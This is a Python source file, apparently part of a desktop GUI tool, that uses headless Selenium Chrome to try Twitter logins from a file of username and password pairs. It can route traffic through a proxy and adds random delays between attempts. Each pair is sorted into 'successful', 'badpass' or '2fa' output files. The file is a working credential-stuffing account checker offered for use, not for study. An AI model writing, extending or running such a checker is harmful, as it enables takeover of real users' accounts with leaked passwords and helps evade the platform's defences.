import tkinter
import random
import time
import os

from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common import exceptions
from selenium import webdriver

from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

from .types import StartEvent
from . import utils


LOGIN_URL = 'https://twitter.com/i/flow/login'
URL_HOME = 'https://twitter.com/home'


OPTIONS = Options()
OPTIONS.add_argument('--ignore-certificate-errors')
OPTIONS.add_argument('window-size=1920x935')
OPTIONS.add_argument('headless')

if os.name == 'nt':
    SERVICE = Service(os.path.join(os.getcwd(), 'static', 'chromedriver_nt.exe'))
else:
    SERVICE = Service(os.path.join(os.getcwd(), 'static', 'chromedriver_mac'))


class TwoFactor(Exception):
    pass

class InvalidPassword(Exception):
    pass


def _login(driver: webdriver.Chrome, wait: WebDriverWait, user: str, password: str) -> None:
    driver.get(LOGIN_URL)

    wait.until(ec.element_to_be_clickable((By.XPATH, '//input[@name="text"]')))
    time.sleep(3)

    driver.find_element(By.XPATH, '//input[@name="text"]').send_keys(user, Keys.ENTER)
    time.sleep(2)

    driver.find_element(By.XPATH, '//input[@name="password"]').send_keys(password, Keys.ENTER)
    time.sleep(3)


    if driver.current_url == LOGIN_URL:
        try:
            element = driver.find_element(By.CLASS_NAME, 'css-1dbjc4n.r-mk0yit.r-1f1sjgu')
            element.find_element(By.NAME, 'text')
        except exceptions.NoSuchElementException:
            raise InvalidPassword
        else:
            raise TwoFactor


def checking(self, event: StartEvent) -> None:
    account_path = event.files_path.get('account')
    proxy_path = event.files_path.get('proxy')
    logger = event.logger

    actions = 0


    if proxy_path:
        logger.update('Run the proxy check... It will take some time!')

        proxy = utils.check_proxy(utils.file_parser(proxy_path, True))
        OPTIONS.add_argument(f'--proxy-server={proxy}')

    try:
        driver = webdriver.Chrome(service=SERVICE, options=OPTIONS)
        wait = WebDriverWait(driver, 20)
    except exceptions.WebDriverException:
        return logger.update('An error occurred while creating webdriver.')

    logger.update('Starting process!')


    for user, password in utils.file_parser(account_path):
        try:
            _login(driver, wait, user, password)
        except exceptions.NoSuchElementException:
            logger.update(f'An unknown error occurred while logging in {user}')
        except TwoFactor:
            logger.update(f'{user} - Authorization Error: Two-Factor authentication.')
            utils.write_account('2fa', user, password)
        except InvalidPassword:
            logger.update(f'{user} - Authorization Error: Wrong password.')
            utils.write_account('badpass', user, password)
        except exceptions.TimeoutException:
            logger.update('Timed out please try again.')
        except Exception:
            logger.update('An unknown error occurred.')

        if driver.current_url != URL_HOME:
            continue

        logger.update(f'{user} - Successful login.')
        utils.write_account('successful', user, password)
        time.sleep(random.randint(0, event.time))
        actions += 1

        if actions >= event.action:
            break

    logger.update('Process completed.')
    driver.quit()

    self.button_start.config(state=tkinter.NORMAL)
    self.button_1.config(state=tkinter.NORMAL)
    self.button_2.config(state=tkinter.NORMAL)
    self.button_3.config(state=tkinter.NORMAL)

    self.entry_1.config(state=tkinter.NORMAL)
    self.entry_2.config(state=tkinter.NORMAL)

    self.checkbox_1.config(state=tkinter.NORMAL)
    self.checkbox_2.config(state=tkinter.NORMAL)
    self.checkbox_3.config(state=tkinter.NORMAL)
    self.checkbox_4.config(state=tkinter.NORMAL)
